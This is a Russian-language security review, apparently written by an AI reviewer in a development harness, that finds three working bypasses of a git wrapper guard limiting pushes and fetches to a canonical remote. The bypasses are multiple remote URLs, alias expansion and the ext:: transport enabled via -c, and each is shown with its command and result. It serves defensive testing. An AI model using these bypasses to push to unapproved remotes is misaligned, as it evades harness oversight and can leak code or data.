FAIL — round 3 finds live pre-exchange bypasses; the green battery does not distinguish them.

Обязательные замеры

* `git log --oneline 8d66d64..HEAD -- scripts/gitw` дал `6d6e9f9 implementer: scripts/gitw И-4в — закрыть обход через git-config-based НЕЯВНОЕ разрешение remote`.
* `bash fixtures/gitw/red_gitw_obmen.sh /home/aka/Documents/dev-harness` завершился rc=0: положительная клетка г0 и г1–г28б зелёны, а 38 обманных стабов умерли каждый на своей клетке.

Живой обход 1 — несколько `remote.<name>.url`

В disposable-репозитории origin получил три URL в таком порядке: канонический, чужой bare, канонический. Перед вызовом `gitw` `git config --get remote.origin.url` вернул последний канонический URL, а `git remote get-url origin` — первый канонический URL. Это ровно две формы, которые проверяет `scripts/gitw`; средний URL не наблюдается. Затем:

```text
GIT_EXCHANGE_GUARD_CANONICAL=<canon> scripts/gitw push origin HEAD:refs/heads/multiurl
rc=0
To <canon> ... HEAD -> multiurl
To <evil>  ... HEAD -> multiurl
Everything up-to-date
```

`refs/heads/multiurl` появился в чужом bare. Настоящий `git push` отправляет во все URL remote, тогда как гард разрешил только первый и последний. Это прямой обход класса «git разрешает цель обмена иначе, чем судит гард».

Тот же дефект существует для нескольких `remote.origin.pushurl`: значения canon/evil/canon дали `config --get` = последний canon и `remote get-url --push` = первый canon; `gitw push` вернул rc=0, а `refs/heads/multipushurl` появился в evil.

Живой обход 2 — alias не разворачивается до классификации подкоманды

При `git config alias.p push` вызов

```text
GIT_EXCHANGE_GUARD_CANONICAL=<canon> scripts/gitw p <evil> HEAD:refs/heads/alias
rc=0
```

прозрачно передаёт argv реальному git как несудимую подкоманду `p`; настоящий git разворачивает alias в `push` и записывает `refs/heads/alias` в evil. Вторая проба `alias.f fetch` также rc=0 и записала SHA evil в `FETCH_HEAD`. Следовательно, И-3 судит буквальный argv[0], а не фактически исполняемый обмен.

Живой обход 3 — `ext::` с разрешением протокола через `-c`

Вызов с относительным bare внутри disposable-клона:

```text
GIT_EXCHANGE_GUARD_CANONICAL=<canon> scripts/gitw -c protocol.ext.allow=always \
  push 'ext::git-receive-pack ext-target.git' HEAD:refs/heads/ext
rc=0
```

создал `refs/heads/ext` в `ext-target.git`. Аналогичный `fetch 'ext::git-upload-pack ext-src.git' main` вернул rc=0 и записал чужой SHA в `FETCH_HEAD`. Строка `ext::...` не содержит `://` и не имеет `/`, поэтому парсер принимает её за bare remote; отсутствующий конфиг-ключ ведёт к прозрачному exec, после которого real git выполняет transport ext. Это именно запрошенный вариант `git -c protocol.ext.allow=...`.

Проверенные не-блокирующие варианты

* `url.<evil>.insteadOf` и `url.<evil>.pushInsteadOf` были проверены отдельными disposable-пробами. Обмен через гард останавливался rc=1 до записи в evil. Для точного `pushInsteadOf` реальный git раскрывает `remote get-url --push` в evil; гард всё же печатает канонический url, а не фактическую push-цель, хотя блокирует обмен. Это ошибка диагностического имени относительно И-4/И-6, не причина живого обхода.
* `scripts/gitw -c protocol.file.allow=always submodule update --init` прозрачно выполнил update (rc=0, checkout submodule есть). Это соответствует явной границе И-3: `submodule` — несудимая подкоманда, поэтому не выдано за самостоятельный контрпример 045.

Позитивный контроль

Клетка г0 батареи выполнила честные `push`, `fetch` и `pull` с одиночным каноническим origin (rc=0); мой отдельный singleton-origin `push origin HEAD:refs/heads/control` также прошёл rc=0 и записал ref только в канонический bare. Следовательно, FAIL не является вечно-красной проверкой.

Вердикт: FAIL. Правка предмета и расширение батареи — работа автора; данный вердикт их не выполняет.
